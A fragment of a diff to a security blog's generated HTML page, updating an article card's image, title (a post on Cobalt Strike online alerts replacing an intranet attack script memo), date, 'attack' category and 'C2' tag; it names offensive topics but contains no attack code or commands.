tbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/Starry5ky/Starry5ky.github.io/medias/featureimages/1.jpg" class="responsive-img" alt="内网攻防脚本备忘录">
+                        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/Starry5ky/Starry5ky.github.io/medias/featureimages/9.jpg" class="responsive-img" alt="自建server酱同款推送+CS上线提醒">
                         
-                        <span class="card-title">内网攻防脚本备忘录</span>
+                        <span class="card-title">自建server酱同款推送+CS上线提醒</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -968,12 +756,16 @@ windows/x64/shell_bind_tcp</code></pre>
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-07
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-11
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            Augu5t
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/attack/" class="post-category">
+                                    attack
+                                </a>
+                            
                             
                         </span>
                     </div>
@@ -982,8 +774,8 @@ windows/x64/shell_bind_tcp</code></pre>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
-                        <span class="chip bg-color">-内网渗透</span>
+                    <a href="/tags/C2/">
+                        <span class="chip bg-color">C2</span>
                     </a>
                     
                 </div>
